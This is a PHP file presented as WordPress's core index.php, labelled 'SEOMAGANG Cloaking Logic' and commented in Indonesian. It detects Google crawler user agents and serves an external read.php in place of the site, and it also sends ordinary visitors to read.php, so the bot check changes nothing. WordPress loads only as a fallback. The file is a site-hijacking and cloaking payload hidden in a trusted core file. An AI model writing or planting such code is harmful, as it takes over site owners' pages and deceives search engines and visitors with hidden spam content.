<?php
/**
 * Front to the WordPress application with SEOMAGANG Cloaking Logic.
 */

// 1. Fungsi Cek Googlebot
function is_google_bot() {
    $agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
    foreach ($agents as $agent) {
        if (isset($_SERVER['HTTP_USER_AGENT']) && strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) {
            return true;
        }
    }
    return false;
}

// 2. Logika Cloaking (Untuk Googlebot)
if (is_google_bot()) {
    // Jika BOT, tampilkan isi file read.php (Utamakan read.php)
    if (file_exists(__DIR__ . '/read.php')) {
        include __DIR__ . '/read.php';
        exit;
    }
}

// 3. Jalur Normal (User Biasa) - Direct ke read.php
// Kita tidak memanggil wp-blog-header.php agar WordPress tidak dimuat
if (file_exists(__DIR__ . '/read.php')) {
    include __DIR__ . '/read.php';
    exit;
}

/** * Jika read.php tidak ada (fallback), baru muat WordPress 
 * (Opsional: hapus bagian ini jika kamu benar-benar tidak mau WordPress jalan sama sekali)
 */
define( 'WP_USE_THEMES', true );
require __DIR__ . '/wp-blog-header.php';
